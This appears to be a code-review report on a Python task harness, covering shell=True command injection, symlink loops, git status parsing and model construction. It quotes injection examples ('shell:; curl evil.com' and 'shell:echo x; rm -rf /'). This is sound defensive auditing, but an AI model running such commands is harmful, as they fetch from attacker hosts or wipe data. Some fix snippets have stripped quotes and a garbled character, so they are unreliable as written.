findings.title: shell=True with user-controlled command in _verify_tier2
findings.why_it_matters: Requirements from cognitive_triad are written by task authors into index.md files. A malicious or careless author could inject shell commands via requirements like shell:; curl evil.com. Using shell=True causes the shell to interpret metacharacters, pipeline operators, and env variables from the command string. While the task author is semi-trusted in normal usage, the pattern of embedding user strings directly into shell=True is fundamentally dangerous and creates a path for command injection.
evidence: harness/__init__.py:128 cmd = req[6:].strip() — strips shell: prefix from user requirement
cognitive_triad requirements are parsed from YAML and never sanitized
findings.suggested_fix: Replace subprocess.run with shell=True by using shlex.split to parse the command, then call subprocess.run([...], shell=False). This prevents shell metacharacter injection. Example: import shlex; args = shlex.split(cmd); result = subprocess.run(args, shell=False, capture_output=True, text=True, timeout=30)

findings.title: find_git_repos BFS does not track visited directories — symlink cycles cause infinite loops
findings.why_it_matters: The BFS loop appends child directories to dirs_to_scan without deduplication. If a symlink creates a directory cycle (e.g., dir/a/b -> ../../), the same directory can be enqueued multiple times, causing an infinite loop. This would hang any code that calls find_git_repos on a workspace with symlink cycles.
evidence: git_ops.py:204 — child.is_dir() returns True for symlinks pointing to dirs
No visited set is maintained to break cycles
findings.suggested_fix: Maintain a set of canonical real paths (using Path.resolve()) to detect already-visited directories. Example: visited = set(); while dirs_to_scan: current = dirs_to_scan.pop(0); real = current.resolve(); if real in visited: continue; visited.add(real); ...

findings.title: get_dirty_files assumes XY filename format but porcelain status codes can be 2 chars
findings.why_it_matters: Git porcelain status uses a 2-character XY format where X is index status and Y is worktree status. The code assumes line[2:] extracts the filename, but XY can be 2 characters meaning the filename actually starts at line[3:]. This means file paths starting with characters that git interprets as status codes could be silently truncated or mis-parsed.
evidence: git_ops.py:164 parts = line[2:].strip() — assumes 2-char status + space prefix
Git porcelain format: XY filename where XY can be ? ,  M, MM, etc.
If a file starts with a space in its name or the status is 2 chars, indexing is wrong
findings.suggested_fix: Use git status --porcelain -z for null-byte delimited output instead of parsing the XY format. This avoids ambiguity: result = subprocess.run([git, status, --porcelain, -z], cwd=repo_path, capture_output=True); files = result.stdout.split(�)[:-1]

findings.title: intercept.py constructs TodoItem via dict instead of model constructor
findings.why_it_matters: Line 93 constructs a todo dict with text and done keys and passes it to snapshot_session as a dict. But snapshot_session at line 99 calls TodoItem(text=t[text], done=t[done]). The dict keys are checked at runtime rather than at construction time. If the dict is malformed, the error occurs inside snapshot_session not at the call site. More importantly, it bypasses Pydantic validation.
evidence: intercept.py:99 TodoItem(text=t[text], done=t[done]) — uses dict access not model construction
The TodoItem model is frozen=True; direct construction enforces invariants
findings.suggested_fix: Create TodoItem directly: todos=[TodoItem(text=t[text], done=t[done]) for t in todos] rather than serializing to string and parsing. Or pass manifest.todos directly to snapshot_session instead of converting to dicts and back.

residual_risks: Tier 2 requirements come from cognitive_triad.requirements — if a task author writes malicious shell commands, they execute with host permissions. There is no sandboxing or timeout beyond the 30s limit.
find_git_repos on workspaces with complex symlink structures (common in monorepos) could hang.
The intercept.py Tier 0 check is a stub (TODO comment at line 212) — constraints are never actually enforced.
testing_gaps: No test for shell injection in Tier 2 (e.g., requirements=["shell:echo x; rm -rf /"])
No test for symlink cycle in find_git_repos
No test for get_dirty_files with 2-char porcelain status codes
No test for intercept.py with malformed todos dict
No test for snapshot_session with non-existent task_id
